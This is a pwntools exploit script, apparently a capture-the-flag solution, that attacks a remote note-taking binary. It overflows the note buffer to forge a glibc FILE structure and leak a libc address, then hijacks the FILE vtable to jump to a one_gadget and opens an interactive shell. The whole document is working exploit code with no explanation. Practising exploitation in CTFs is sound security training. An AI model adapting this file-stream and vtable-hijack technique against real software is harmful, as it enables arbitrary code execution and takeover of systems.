from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# r = process('./chal')
r = remote('edu-ctf.zoolab.org', 30218)
l = ELF('../libc.so.6')

def create_note():
    r.sendlineafter('> ', '1')

def write_note(data):
    r.sendlineafter('> ', '2')
    r.sendlineafter('data> ', data)

def save_note():
    r.sendlineafter('> ', '3')

create_note()

# Leak libc addr
payload1 = flat(
    0x0, 0,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    1
)

write_note(b'A' * 0x210 + payload1)
save_note()

payload2 = flat(
    0x1800, 0,
    0, 0
)

write_note(b'A' * 0x210 + payload2)
# gdb.attach(r)
save_note()
save_note()
save_note()
save_note()
save_note()
save_note()
save_note()
save_note()

r.recv(0x80)
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ecf60
vtable = libc + l.sym['_IO_file_jumps']
one_gadget = libc + 0xe6c81

print(hex(libc))
print(hex(vtable))

# Hijack vtable
addr = vtable + 0x28
payload3 = flat(
    0, 0,
    0, 0,
    0, addr,
    addr + 0x8, 0,
    0
)

write_note(p64(one_gadget) + b'A' * 0x208 + payload3)
save_note()

r.interactive()
